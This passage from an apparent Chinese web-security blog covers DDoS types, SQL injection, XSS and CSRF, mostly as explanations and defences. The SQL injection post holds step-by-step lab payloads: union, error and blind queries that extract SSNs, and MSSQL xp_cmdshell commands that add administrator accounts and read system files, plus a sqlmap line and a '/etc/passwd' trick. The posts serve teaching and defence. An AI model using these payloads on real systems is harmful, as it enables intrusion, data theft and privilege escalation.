Time（一般为30秒至2分钟），如果超时则丢弃这个连接。攻击者大量发送这种伪造源地址的SYN请求，服务器端将会消耗非常多的资源（CPU和内存）来处理这种半连接，同时还要不断地对这些IP进行SYN+ACK重试。最后的结果是服务器无暇理睬正常的连接请求，导致拒绝服务。 对抗SYN flood的主要措施有SYN Cookie/SYN Proxy、safereset等算法。SYN Cookie的主要思想是为每一个IP地址分配一个“Cookie”，并统计每个IP地址的访问频率。如果在短时间内收到大量的来自同一个IP地址的数据包，则认为受到攻击，之后来自这个IP地址的包将被丢弃。 0x03 攻击类型 网络层攻击 Syn-flood 利用TCP建立连接时3次握手的“漏洞”，通过原始套接字发送源地址虚假的SYN报文，使目标主机永远无法完成3次握手，占满了系统的协议栈队列，资源得不到释放，进而拒绝服务，是互联网中最主要的DDOS攻击形式之一。网上有一些加固的方法，例如调整内核参数的方法，可以减少等待及重试，加速资源释放，在小流量syn-flood的情况下可以缓解，但流量稍大时完全不抵用。防御syn-flood的常见方法有：syn proxy、syn cookies、首包（第一次请求的syn包）丢弃等。 ACK-flood 对于虚假的ACK包，目标设备会直接回复RST包丢弃连接，所以伤害值远不如syn-flood。DDOS的一种原始方式。 UDP-flood 使用原始套接字伪造大量虚假源地址的UDP包，目前以DNS协议为主。 ICMP-flood Ping洪水，比较古老的方式。 应用层攻击 CC ChallengeCollapsar的名字源于挑战国内知名安全厂商绿盟的抗DDOS设备-“黑洞”，通过botnet的傀儡主机或寻找匿名代理服务器，向目标发起大量真实的http请求，最终消耗掉大量的并发资源，拖慢整个网站甚至彻底拒绝服务。 “CC攻击”的前身是一个叫fatboy的攻击程序，当时黑客为了挑战绿盟的一款反DDOS设备开发了它。绿盟是中国著名的安全公司之一，它有一款叫“黑洞（Collapasar）”的反DDOS设备，能够有效地清洗SYN Flood等有害流量。而黑客则挑衅式地将fatboy所实现的攻击方式命名为：Challenge Collapasar（简称CC），意指在黑洞的防御下，仍然能有效完成拒绝服务攻击。 CC攻击的原理非常简单，就是对一些消耗资源较大的应用页面不断发起正常的请求，以达到消耗服务端资源的目的。在Web应用中，查询数据库、读/写硬盘文件等操作，相对都会消耗比较多的资源 互联网的架构追求扩展性本质上是为了提高并发能力，各种SQL性能优化措施：消除慢查询、分表分库、索引、优化数据结构、限制搜索频率等本质都是为了解决资源消耗，而CC大有反其道而行之的意味，占满服务器并发连接数，尽可能使请求避开缓存而直接读数据库，读数据库要找最消耗资源的查询，最好无法利用索引，每个查询都全表扫描，这样就能用最小的攻击资源起到最大的拒绝服务效果。 互联网产品和服务依靠数据分析来驱动改进和持续运营，所以除了前端的APP、中间件和数据库这类OLTP系统，后面还有OLAP，从日志收集，存储到数据处理和分析的大数据平台，当CC攻击发生时，不仅OLTP的部分受到了影响，实际上CC会产生大量日志，直接会对后面的OLAP产生影响，影响包括两个层面，一个当日的数据统计完全是错误的。第二个层面因CC期间访问日志剧增也会加大后端数据处理的负担。 CC是目前应用层攻击的主要手段之一，在防御上有一些方法，但不能完美解决这个问题。 DNS flood 伪造源地址的海量DNS请求，用于是淹没目标的DNS服务器。对于攻击特定企业权威DNS的场景，可以将源地址设置为各大ISP DNS服务器的ip地址以突破白名单限制，将查询的内容改为针对目标企业的域名做随机化处理，当查询无法命中缓存时，服务器负载会进一步增大。 DNS不只在UDP-53提供服务，同样在TCP协议提供服务，所以防御的一种思路就是将UDP的查询强制转为TCP，要求溯源，如果是假的源地址，就不再回应。对于企业自有权威DNS服务器而言，正常请求多来自于ISP的域名递归解析，所以将白名单设置为ISP的DNS server列表。对于源地址伪造成ISP DNS的请求，可以通过TTL值进一步判断。 慢速连接攻击 针对http协议，以知名的slowloris攻击为起源：先建立http连接，设置一个较大的content-length，每次只发送很少的字节，让服务器一直以为http头部没有传输完成，这样的连接一多很快就会出现连接耗尽。 目前出现了一些变种，http慢速的post请求和慢速的read请求都是基于相同的原理。 DOS攻击 应用层DDOS，不同于网络层DDOS，由于发生在应用层，因此TCP三次握手已经完成，连接已经建立，所以发起攻击的IP地址也都是真实的。但应用层DDOS有时甚至比网络层DDOS攻击更为可怕，因为今天几乎所有的商业Anti-DDOS设备，只在对抗网络层DDOS时效果较好，而对应用层DDOS攻击却缺乏有效的对抗手段。 有些服务器程序存在bug、安全漏洞，或架构性缺陷，攻击者可以通过构造的畸形请求发送给服务器，服务器因不能正确处理恶意请求而陷入僵死状态，导致拒绝服务。例如某些版本的app服务器程序存在缓冲区溢出，漏洞可以触发但无法得到shell，攻击者可以改变程序执行流程使其跳转到空指针或无法处理的地址，用户态的错误会导致进程挂起，如果错误不能被内核回收则可能使系统当掉。 这类问题效果也表现为拒绝服务，但本质上属于漏洞，可以通过patch程序的最新版本解决，笔者认为不属于DDOS的范畴。 攻击方式 混合型 在实际大流量的攻击中，通常并不是以上述一种数据类型来攻击，往往是混杂了TCP和UDP流量，网络层和应用层攻击同时进行。 反射型 2004年时DRDOS第一次披露，通过将SYN包的源地址设置为目标地址，然后向大量的 验证码验证码是互联网中常见的技术之一，英文简称是CAPTCHA（Completely Autornated Public Turing Test to Tell Computers and Humans Apart，全自动区分计算机和人类的图灵测试）。 CAPTCHA发明的初衷，是为了识别人与机器。 因为验证码的验证过程，是比对用户提交的明文和服务器端Session里保存的验证码明文是否一致。 资源耗尽攻击Slowloris攻击 Slowloris￼是在2009年由著名的Web安全专家RSnake提出的一种攻击方法，其原理是以极低的速度往服务器发送HTTP请求。由于Web Server对于并发的连接数都有一定的上限，因此若是恶意地占用住这些连接不释放，那么Web Server的所有连接都将被恶意连接占用，从而无法接受新的请求，导致拒绝服务。 HTTP POST DOS在2010年的OWASP大会上，Wong Onn Chee和Tom Brennan演示了一种类似于Slowloris效果的攻击方法，作者称之为HTTP POST D.O.S 0x04 防御应用层DDOSDDOS攻击本质上是一种只能缓解而不能完全防御的攻击，它不像漏洞那样打个补丁解决了就是解决了，DDOS就算购买和部署了当前市场上比较有竞争力的防御解决方案也完全谈不上彻底根治。防火墙、IPS、WAF这些安全产品都号称自己有一定的抗DDOS能力，而实际上他们只针对小流量下，应用层的攻击比较有效，对于稍大流量的DDOS攻击则无济于事。 让客户端解析一段JavaScript，并给出正确的运行结果。因为大部分的自动化脚本都是直接构造HTTP包完成的，并非在一个浏览器环境中发起的请求。 在Apache的配置文件中，有一些参数可以缓解DDOS攻击，比如调小Timeout、KeepAliveout值，增加MaxClients值。 用开源的Module来实现针对应用层DDOS攻击的保护。mod_qos是Apahe的一个Module，它可以帮助缓解应用层DDOS攻击。 主机设置所有的主机平台都有抵御DoS的设置，总结一下，基本的有几种： 关闭不必要的服务 限制同时打开的Syn半连接数目 缩短Syn半连接的time out 时间 及时更新系统补丁 网络设置网络设备可以从防火墙与路由器上考虑。这两个设备是到外界的接口设备，在进行防DDoS设置的同时，要注意一下这是以多大的效率牺牲为代价的，对你来说是否值得。 1.防火墙 禁止对主机的非开放服务的访问 限制同时打开的SYN最大连接数 限制特定IP地址的访问 启用防火墙的防DDoS的属性 严格限制对外开放的服务器的向外访问 第五项主要是防止自己的服务器被当做工具去害人。 2.路由器 设置SYN数据包流量速率 升级版本过低的ISO 为路由器建立log server。 0x05 参考文献https://wooyun.kieran.top/#!/drops/774.%E6%B5%85%E6%9E%90%E5%A4%A7%E8%A7%84%E6%A8%A1DDOS%E9%98%B2%E5%BE%A1%E6%9E%B6%E6%9E%84-%E5%BA%94%E5%AF%B9T%E7%BA%A7%E6%94%BB%E9%98%B2]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>DDOS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分享一波手工SQL注入]]></title>
    <url>%2F2018%2F09%2F02%2F%E5%88%86%E4%BA%AB%E4%B8%80%E6%B3%A2SQL%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[0x01 SQL注入简介SQL注入（SQL Injection），简称注入攻击、SQL注入，被广泛用于非法获取网站控制权，是发生在应用程序的数据库层上的安全漏洞。在设计程序，忽略了对输入字符串中夹带的SQL指令的检查，被数据库误认为是正常的SQL指令而运行，从而使数据库受到攻击，可能导致数据被窃取、更改、删除，以及进一步导致网站被嵌入恶意代码、被植入后门程序等危害。 所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。比如先前的很多影视网站泄露VIP会员密码大多就是通过WEB表单递交查询字符暴出的，这类表单特别容易受到SQL注入式攻击 SQL注入漏洞可读取/修改数据库中的库和表，获取用户的账号，密码，邮箱，联系方式，信用卡信息，修改产品价格，删除数据。修改权限，获取系统管理员权限，修改任意门文件，安装后门。 0x02 SQL注入原理 SQL注入产生的原因程序开发过程中不注意规范书写sql语句和对特殊字符进行过滤，导致客户端可以通过全局变量POST和GET提交一些sql语句正常执行 盲注：就是在服务器没有错误回显时完成的注入攻击。服务器没有错误回显，对于攻击者来说缺少了非常重要的“调试信息”，所以攻击者必须找到一个方法来验证注入的SQL语句是否得到执行。 Timing Attack利用BENCHMARK（）函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长；通过时间长短的变化，可以判断出注入语句是否执行成功。 Timing Attack是盲注的一种高级技巧 命令执行利用“用户自定义函数”的技巧，即UDF（User-Defined Functions）来执行命令。 0x03 编码注入方式宽字节注入，这个是怎么回事呢？ 在实际环境中程序员一般不会写上面类似的代码，一般都会用addslashes()等过滤函数对从web传递过来的参数进行过滤。不过有句话叫做，道高一尺魔高一丈，我们看看白帽子是怎么突破的。用PHP连接MySQL的时候，当设置character_set_client=gbk时候会导致一个编码漏洞。我们知道addslashes() 会把参数 1’ 转换成 1\’,而我们提交参数 1%df’ 时候会转成 1縗’，那我们输入1%df’ or 1=1%23时候，会被转换成 1縗’ or 1=1#’。 简单来说%df’会被过滤函数转义为%df\’ ，%df\’ = %df%5c%27 在使用gbk编码的时候会认为%df%5c是一个宽字节%df%5c%27=縗’，这样就会产生注入。 那如何防御这个宽字节呢？我希望大家开发网站尽量使用UTF8编码格式，如果转换麻烦，最安全的方法就是使用PDO预处理。挖掘这种漏洞主要是检查是否使用了gbk，搜索guanjianc character_set_client=gbk 和mysql_set_chatset(‘gbk’) 。 二次urldecode注入，这中方式也是因为使用了urldecode不当所引起的漏洞。 我们刚才知道了 addslashes()函数可以防止注入，他会在(‘)、(“)、()前面加上反斜杠来转义。 那我们假设我们开启了GPC，我们提交了一个参数，/test.php?uid=1%2527,因为参数中没有单引号，所以第一次解码会变成uid=1%27,%25解码出来就是%， 这时候程序里如果再去使用urldecode来解码，就会把%27解码成单引号(‘)，最终的结果就是uid=1’. 我们现在知道了原有是因为urldecode引起的，我们可以通过编辑器的搜索urldecode和rawurldecode找到二次url漏洞。 从漏洞类型区分可以分为三种类型：1.可显 攻击者可以直接在当前界面内容中获取想要获得的内容。 2.报错 数据库查询返回结果并没有在页面中显示，但是应用程序将数据库报错信息打印到了页面中。 所以攻击者可以构造数据库报错语句，从报错信息中获取想要获得的内容，所以我建议在数据库类中设置不抛出错误信息。 3.盲注 数据库查询结果无法从直观页面中获取攻击者通过使用数据库逻辑或使数据库库执行延时等方法获取想要获得的内容。 0x04 SQL 注入漏洞挖掘方法针对上面提到的利用漏洞方法，总结了以下的挖掘方法： 参数接收位置，检查是否有没过滤直接使用 _POST、$_COOKIE 参数的。 SQL语句检查，搜索关键词 select update insert 等SQL语句关键处，检查SQL语句的参数是否可以被控制。 宽字节注入,如果网站使用的 GBK 编码情况下，搜索guanjianc character_set_client=gbk 和mysql_set_chatset(‘gbk’)就行。 二次 urldecode 注入，少部分情况，gpc 可以通过编辑器的搜索 urldecode 和 rawurldecode 找到二次url漏洞。 0x05 正确的防御SQL注入1、使用预编译语句，绑定变量。 2、使用存储过程：使用安全的存储过程对抗SQL注入。 3、检查数据类型 4、使用安全函数 0x06 SQL注入实战SQL注入一般流程 DVWA之SQL注入篇1、首先猜查询信息的列数11‘ order by 2 # 2、获取数据库版本信息 11&apos; and 1=2 union select 1, (@@version); # 3、获取当前的数据库名称 11&apos; and 1=2 union select 1, (database()); # 4、获取数据库所有的库名称 11&apos; union select 1,group_concat(schema_name) from information_schema.schemata # 5、获取数据库下表的名称 11&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 6、获得表的字段 11&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos; # 7、下载数据11&apos; union select group_concat(user_id,first_name,last_name),group_concat(password) from users # MCIR SQLol Challenges SQL注入Challenge 0 - Hello, world!11&apos; or 1=1 # Challenge 1 - SQL Injection 101题意是找到social security present表并提取出该表的所有信息。 11&apos; order by 1# //猜列数 11&apos; and 1=2 union select database() # //查询当前数据库 11&apos; and 1=2 union select concat_ws(char(32,58,32),user(),database(),version()) # // _ws(char(32,58,32) 表示空格冒号空格 11&apos; union select group_concat(table_name) from information_schema.tables where table_schema=database() # 11&apos; and 1=2 union select concat_ws(char(32,58,32),name,ssn) from ssn # Challenge 2题意是过滤掉了单引号然后要实现Challenge1 11 and 1=2 union select concat_ws(char(32,58,32),name,ssn) from ssn # Challenge 3 - Death Row与Challenge1类似但要求是一次只返回一行的结果 11&apos; and 1=2 union select concat(name,&apos; &apos; ,ssn) from ssn limit 1 # 接下来的以此类推。 Challenge 4 - War on Error题意是results出没有显示内容，但查询结果在errors处显示出来。 1&apos; and updatexml(&apos;junk&apos;,concat(0x01,(SELECT concat(name,&apos; &apos;,ssn) FROM ssn limit 0,1),0x20),1) # Challenge 5 - Blind Lucksql盲注，没有错误提示 1&apos; or ascii(substring((select user()),1,1)) = 112 # ---112是P 1&apos; or ascii(substring((select user()),2,1)) = 116 # 116---代表的是t 1&apos; or ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) &gt;= 115 # 接着试&gt;=116 发现没有出现Got resultst说明第一个表名的第一个字母为s。 自搭MSSQL注入环境启动vm20031.开始–程序–mssqlserver-服务管理器–服务启动 2.iis服务管理器-网站–wenzhang:主机头，启动 浏览器输入192.168.2.5访问wenzhang网站，在点击导读，然后里面存在注入点。 http://192.168.2.5/list.asp?id=1 1.判断数据库类型：‘and (select count(*) from 独有表)&gt;0oracle:dualmssql:sysobjectsmysql:shemaaccess:mssysobjects 2.判断版本号：1and @@version&gt;0 Microsoft SQL Server 2000 Windows NT 5.2 NT 5.0:windows 2000 NT 5.2:Windows 2003 NT 6.1:windows7 sp 3.当前连接数据库的用户：dbo=sa 1and user&gt;0 4.判断当前连接的数据库：article 1and db_name()&gt;0 5.判断其它数据库 1and (select name from master..sysdatabases where dbid=6)&gt;0 dbid的值可以从1-6选择，会爆出相应的项。 6.判断表：’t_jiaozhu’ 1and (select top 1 name from sysobjects where xtype=&apos;u&apos; and status&gt;0)&gt;0 7.判断其它表：admin 1and (select top 1 name from sysobjects where xtype=&apos;u&apos; and status&gt;0 and name not in(&apos;t_jiaozhu&apos;,&apos;Aclass&apos;))&gt;0 8.判断列名：admin(usernae,password) 1and (Select Top 1 col_name(object_id(&apos;admin&apos;),1) from sysobjects)&gt;0 9.判断值 1and (select username from admin)&gt;0 10.修改密码 12;update article.dbo.admin set password=&apos;cccccc&apos; where username=&apos;admin&apos;;-- #将admin的密码改成ccccccand (select password from admin)&gt;0 #检测是否更改成功 11.添加数据库的用户； （1）1;exec master..sp_addlogin hyd,888888;-- （2）查看vm2003中：开始–程序–mssqlserver–企业管理器–安全性–登录 （3）提权：把hyd加入sysadmin组 1;exec master..sp_addsrvrolemember hyd,sysadmin;-- 4.利用：数据库连接工具：查询分析器,navicat: 操作系统提权1.新建用户: 1;exec master..xp_cmdshell &apos;net user cisp 888888 /add &apos;-- 2.提权： 1;exec master..xp_cmdshell &apos;net localgroup administrators cisp /add&apos;-- 3.利用：3389;ipc空连接 用远程桌面连接，它的远程桌面端口开的是1234 读系统文件c:\boot.ini1.数据连接工具：navicat: 2.查询–新建查询 123create table jjboot(line varchar(5000));bulk insert jjboot from &apos;c:\boot.ini&apos;;select * from jjboot 向系统写文件1;exec master..xp_cmdshell &apos;echo aaa &gt;&gt;c:\a.txt&apos;-- xp_cmdshell防御1.删除： 1;exec master..sp_dropextendedproc &apos;xp_cmdshell&apos; 2.恢复： 1;exec master..sp_addextendedproc &apos;xp_cmdshell&apos;,&apos;xplog70.dll&apos; 3.防xp_cmdshell.防未公布：cmd反弹 c:\windows\system32\cmd.exe 删除所有默认权限，添加administrator–完全控制 防注入：1.脚本调用：编写防注入脚本 过滤关键字：and or union ; ‘ sp_ xp_ update exec select delete drop 防post get cookie 判断哪个脚本有漏洞 调用：include file=noinject.asp 最前面：搜索型 2.安全编码：int–&gt;cint,参数化查询 3.waf:web app fw: 软件，硬件 sqlmap:tamper:base 通配符：cat ??t /etc/passwd as /**/ hash: sqlmap.py -u url -v 3 0X07 参考文献https://blog.csdn.net/xianjie0318/article/details/80900632 http://www.freebuf.com/articles/web/120747.html]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS姿势分享]]></title>
    <url>%2F2018%2F08%2F30%2FXSS%E5%A7%BF%E5%8A%BF%E5%88%86%E4%BA%AB%2F</url>
    <content type="text"><![CDATA[0x01 什么是XSS（Cross-Site Scripting）XSS即跨站脚本攻击（Cross Site Scripting）是指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。为了与层叠样式表（Cascading Style Sheets）的缩写CSS区分开，跨站脚本攻击通常简写为XSS。XSS 属于被动式的攻击，因为其被动且不好利用，所以许多人常呼略其危害性。在 WEB2.0 时代，强调的是互动，使得用户输入信息的机会大增，在这个情况下，我们作为开发者，在开发的时候，要提高警惕。 0x02 XSS漏洞分类1.反射型，危害小，一般反射型XSS原理：就是通过给别人发送带有恶意脚本代码参数的URL，当URL地址被打开时，特定的代码参数会被HTML解析，执行，如此就可以获取用户的COOIKE，进而盗号登陆。比如hack甲构造好修改密码的URL并把密码修改成123，但是修改密码只有在登陆方乙才能修改，乙在登陆的情况下点击甲构造好的URL将直接在不知情的情况下修改密码。 特点是：非持久化，必须用户点击带有特定参数的链接才能引起。 反射型XSS是比较普遍的XSS，其危害程度通常被认为较小。但是某些反射型XSS造成的后果会很严重，如在输入框的name中输入&lt;meta http equiv=&quot;refresh&quot; content=&quot;5&quot; /&gt;，服务器不加处理，将name的值直接送到浏览器，则浏览器会每5秒自动刷新一次。严重者会导致服务器崩溃。 反射型XSS常见场景： 将前端获取的内容，直接输出到浏览器页面 将前端获取的内容，直接输出到HTML标签 将前端获取的内容，直接输出到&lt;script&gt;标签 2.存储型，危害大，影响时间长存储型XSS原理，假设你打开了一篇正常的文章页面，下面有评论功能。这个时候你去评论了一下，在文本框中输入了一些JavaScript代码，提交之后,你刷新这个页面后发现刚刚提交的代码又被原封不动的返回来并且执行了。 这个时候你会想,我要写一段 JavaScript 代码获取 cookie 信息，然后通过ajax发送到自己的服务器去。构造好代码后你把链接发给其他的朋友，或者网站的管理员，他们打开 JavaScript 代码就执行了，你服务器就接收到了sessionid，你就可以拿到他的用户权限了。 3.dom型，特殊的一种dom型 XSS 是因为 JavaScript 执行了dom 操作，所造成的 XSS 漏洞，具体如下图。可以看到虽然经过 html 转义了，但是这块代码在返回到 html 中，又被 JavaScript 作为 dom 元素操作。那当我输入?name=&lt;img src=1 onerror=alert(1)&gt;的时候依然会存在 XSS 漏洞。 漏洞思路：搜索内容、发表文章、留言、评论回复 XSS漏洞挖掘方法根据上面的一些特点，可以总结出几个分析出几个挖掘方法： 数据接收位置，检查 _POST、$_COOKIE是否经过转义。 常见的反射型XSS搜索这种类似位置发现次数较多。 而存储型在文章，评论出现比较多。 0x03 XSS PayloadXSS攻击成功后，攻击者能够对用户当前浏览器的页面植入恶意脚本，通过恶意脚本，控制用户的浏览器。这些用以完成各种具体功能的恶意脚本，被称为“XSS Payload” XSS Payload实际上就是JavaScript脚本，所以任何JavaScript脚本能实现的功能，XSS Payload都能做到。 一个最常见的XSS Payload，就是通过读取浏览器的Cookie对象，从而发起“Cookie劫持” 0x04 XSS 攻击平台Attack APIAttack API是安全研究者php所主导的一个项目，它总结了很多能够直接使用XSS Payload，归纳为API的方式。 BeEFBeEF曾经是最好的XSS演示平台。不同于Attack API，BeEF所演示的是一个完整的XSS攻击过程，BeEF有一个控制后台，攻击者可以在后台控制前段的一切。 XSS-ProxyXSS-proxu是一个轻量级的XSS攻击平台，通过嵌套iframe的方式可以实时地远程控制被XSS攻击的浏览器。 0x05 终极武器：XSS Worm以往的蠕虫是利用服务器软件漏洞进行传播的。比如2003年的冲击波蠕虫，利用的是Windows的RPC远程溢出漏洞。 XSS Worm是XSS的一种终极利用方式，它的破坏力和影响力是巨大的，但是发起XSS Worm攻击也有一定的条件。 一般来说，用户之间发生交互行为的页面，如果存在存储型XSS，则比较容易发起XSS Worm攻击 Samy Worm、百度空间蠕虫 0x06 XSS构造技巧利用字符编码、绕过长度限制、使用标签、 jQuery是JavaScript框架 0x07 XSS的防御四两拨千斤：HttpOnly浏览器将禁止页面的JavaScript访问带有HttpOnly属性的COOkie。 严格说，HttpOnly并非为了对抗XSS——HttpOnly解决的是XSS后的Cookie劫持攻击。 一个Cookie的使用过程如下：Step1：浏览器向服务器发送请求，这时候没有Cookie Step2：服务器返回时发送Set-Cookie头，向客户端浏览器写入Cookie。 Step3：在该Cookie到期前，浏览器访问该域下的所有页面，都将发送Cookie HttpOnly是在Set-Cookie时标记的。 输入检查常见的Web漏洞如XSS、SQL Injection等，都要求攻击构造一些特殊字符，这些特殊字符可能正常用户不会用到，所以输入检查就有存在的必要了。 输出检查一般来说，除了富文本的输出外，在变量输出到HTML页面时，可以使用编码转义的方式来防御XSS攻击。 安全的编码函数，针对HTML代码的编码方式是HtmlEncode XSS攻击主要发生在MVC架构中的View层，大部分的XSS漏洞可以在模板系统中解决。 XSS的本质还是一种“HTML注入”，用户的数据被当成了HTML代码一部分来执行，从而混淆了原本的语义，产生了新的语义。 处理富文本网站需要允许用户提交一些自定义的HTML代码，称之为“富文本”。 在过滤富文本时，“事件”应该被严格禁止，因为“富文本”的展示需求里不应该包括“事件”这种动态效果。而一些危险的标签，比如、、、等，也应该严格禁止的。 在标签的选择上，应该使用白名单，避免使用黑名单。 防御DOM Based XSS从JavaScript输出到HTML页面，也相当于一次XSS输出的过程，需要分语境使用不同的编码函数。 服务器端直接输出变量到JavaScript。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[邪恶的CSRF]]></title>
    <url>%2F2018%2F08%2F30%2F%E9%82%AA%E6%81%B6%E7%9A%84CSRF%2F</url>
    <content type="text"><![CDATA[0x01 什么是CSRFCSRF的全名是Cross Site Regery，即跨站点请求伪造，是一种对网站的恶意利用。听起来像跨站脚本（XSS），但它与XSS非常不同，XSS利用站点内的信任用户。 而 CSRF 则通过伪装来自受信任用户的请求来利用受信任的网站。与 XSS 攻击相比，CSRF 攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。 csrf主要用来做越权操作，而且 csrf 一直没有被关注起来，所以很多程序现在也没有相关的防范措施。 0x02 CSRF的攻击过程大致如图： 0x03 CSRF攻击存在的道理一种攻击方式之所以能够存在，必然是因为它能够达到某种特定的目的。比如：通过程序中的缓冲区溢出漏洞，我们可以尝试控制程序的流程，使其执行任意代码；通过网站上的SQL注入漏洞，我们可以读取数据库中的敏感信息，进而获取Webshell甚至获取服务器的控制权等等。而CSRF攻击能够达到的目的是使受害者发出由攻击者伪造的请求，那么这有什么作用呢？ 显然，这种攻击的威力和受害者的身份有着密切的联系。说到这儿我们可以思考一下，攻击者之所以要伪造请求由受害者发出，不正是想利用受害者的身份去达到一些目的吗？换句话说，受害者身上有达到这个目的所必需的条件， 而这些必需的条件在Web应用中便是各种各样的认证信息，攻击者就是利用这些认证信息来实现其各种各样的目的。 0x04 CSRF的危害前面说了CSRF的基本概念，列举了几个CSRF的攻击场景，讲述了几种CSRF的攻击方法，现在我们来简单总结一下CSRF攻击可能造成的危害。 CSRF能做的事情大概如下：1）篡改目标网站上的用户数据； 2）盗取用户隐私数据； 3）作为其他攻击向量的辅助攻击手法； 4）传播CSRF蠕虫。 其中前两点我们在之前的例子中已经做了比较详细的说明，不再赘述。第三点即将其他攻击方法与CSRF进行结合进行攻击，接下来我们以实际的漏洞实例来说明CSRF的第三个危害。 另外，CSRF蠕虫就是利用之前讲述的各种攻击方法，并且在攻击代码里添加了形成蠕虫传播条件的攻击向量，这一点会在本文的最后介绍。 0x05 CSRF进阶浏览器的Cookie策略浏览器所持有的Cookie分为两种：一种是“Session Cookie”，又称“Cookie”；另一种是“Third-party Cookie”，也称为“本地Cookie。 两者的区别在于，Third-party Cookie是服务器在Set-cookie时指定了Expire时间，只有到了Expire时间后Cookie才会失效，所以这种Cookie会保存在本地；而Session Cookie则没有指定Expire时间，所有浏览器关闭后，Session Cookie就失效了。 0x06 CSRF的防御要防御CSRF攻击，我们就要牢牢抓住CSRF攻击的几个特点。 首先是“跨域”，我们发现CSRF攻击的请求都是跨域的，针对这一特点，我们可以在服务端对HTTP请求头部的Referer字段进行检查。一般情况下，用户提交的都是站内的请求，其Referer中的来源地址应该是站内的地址。至关重要的一点是，前端的JavaScript无法修改Referer字段，这也是这种防御方法成立的条件。 不过需要说明的是，有的时候请求并不需要跨域，比如我们后面讲到的结合XSS进行攻击的时候，有的时候甚至没有Referer字段…，这些也是使用这种防御方法的弊病所在。 第二点是“伪造”，这也是CSRF攻击的核心点，即伪造的请求。我们来想一下，攻击者为什么能够伪造请求呢？换句话说，攻击者能够伪造请求的条件是什么呢？纵观之前我们伪造的所有请求，无一例外，请求中所有参数的值都是我们可以预测的，如果出现了攻击者无法预测的参数值，那么将无法伪造请求，CSRF攻击也不会发生。基于这一点，我们有了如下两种防御方法： 添加验证码； 使用一次性token。 先看看第一种。验证码的核心作用是区分人和机器，而CSRF攻击中的请求是在受害者上当的情况下由浏览器自动发出的，属于机器发出的请求，攻击者无法预知验证码的值，所以使用验证码可以很好地防御CSRF攻击，但毫无疑问，验证码会一定程度地影响用户体验，所以我们要在安全和用户体验之间找到一个平衡点。 再看看第二种方法。所谓token是一段字母数字随机值，我们可以把它理解为一个服务端帮我们填好的验证码！每当我们访问该页面时，服务端会根据时间戳、用户ID、随机串等因子生成一个随机的token值并传回到前端的表单中，当我们提交表单时，token会作为一个参数提交到服务端进行验证。在这个请求过程中，token的值也是攻击者无法预知的，而且由于同源策略的限制，攻击者也无法使用JavaScript获取其他域的token值，所以这种方法可以成功防御CSRF攻击，也是现在用的最多的防御方式。 但是，需要注意的一点是，token的生成一定要随机，即不能被攻击者预测到，否则这种防御将形同虚设。另外，token如果作为GET请求的参数在url中显示的话，很容易在Referer中泄露。还有更重要的一点：如果在同域下存在XSS漏洞，那么基于token的CSRF防御将很容易被击破，我们后面再说。 除了“跨域”和“伪造”两点，我们还可以注意到CSRF在攻击时间上的特点：CSRF攻击都是在受害者已经完成身份认证之后发生的，这是由CSRF攻击的目的所决定的。基于这一点，我们还可以想出一些缓解CSRF攻击的方法（注意是缓解），比如缩短Session的有效时间等等，可能一定程度上会降低CSRF攻击的成功率。 总结一下上面的防御方法如下： 验证Referer； 使用验证码； 使用CSRF token； 限制Session生命周期。 其中第四种属于缓解类方法，就不多说了。我们看一下其他三种方法都分别存在什么弊病。 Referer最大弊病：有些请求不带Referer； 验证码最大弊病：影响用户体验； CSRF token最大弊病：随机性不够好或通过各种方式泄露，此外，在大型的服务中需要一台token生成及校验的专用服务器，需要更改所有表单添加的字段，有时效性的问题。 那么有没有其它的办法能够有效地防御CSRF攻击呢？xeye团队的monyer提出了下面这样的方法： 原理与token差不多：当表单提交时，用JavaScript在本域添加一个临时的Cookie字段，并将过期时间设为1秒之后在提交，服务端校验有这个字段即放行，没有则认为是CSRF攻击。 前面提到，token之所以可以防御CSRF，是因为攻击者无法使用JavaScript获取外域页面中的token值，必须要遵守同源策略；而临时Cookie的原理是：Cookie只能在父域和子域之间设置，也遵守同源策略，攻击者无法设置该Cookie。 0x07 CSRF蠕虫蠕虫有两大特征：1） 传播性； 2） 恶意行为。 蠕虫的恶意行为是由其传播性引起的，也就是说，凡是传播可以做的事，蠕虫基本上都可以做，而且还可以做些和特定蠕虫有关的事，比如我们要说的CSRF蠕虫就可以大批量地获取用户的隐私信息（CSRF的危害之一嘛）。 所以，我们主要研究CSRF蠕虫的传播性。 CSRF蠕虫的传播性如何实现呢？在前面我们提到过，CSRF蠕虫就是在CSRF的攻击页面中加入了蠕虫传播的攻击向量。这听上去感觉很容易，但实施起来恐怕还要多考虑一些东西。 仔细想想，在一个SNS网站上传播CSRF蠕虫有一个不得不考虑的问题：蠕虫面对的是不同的用户，而不仅仅是某一个受害者。那对于不同的用户，其对应的请求（CSRF核心：伪造的请求嘛）会不会有些地方不一样呢？ 没错，在之前的CSRF攻击中，我们的攻击目标是某一个特定的个体。当我们可以预测其请求的所有参数之后，我们就可以发起攻击。但是在SNS网站上传播CSRF蠕虫就不是这么简单。即使每个用户的所有请求参数都可以预测，但是对于不同的用户，其对应的请求参数是不一样的，我们无法像前面的攻击那样构造攻击页面，必须想办法获取这些标识不同用户的数据。 方法一：利用服务端脚本获取 在这里，我们构造的攻击页面不是一个简单的.html文件了，而是一个服务端脚本，如php、asp等等。 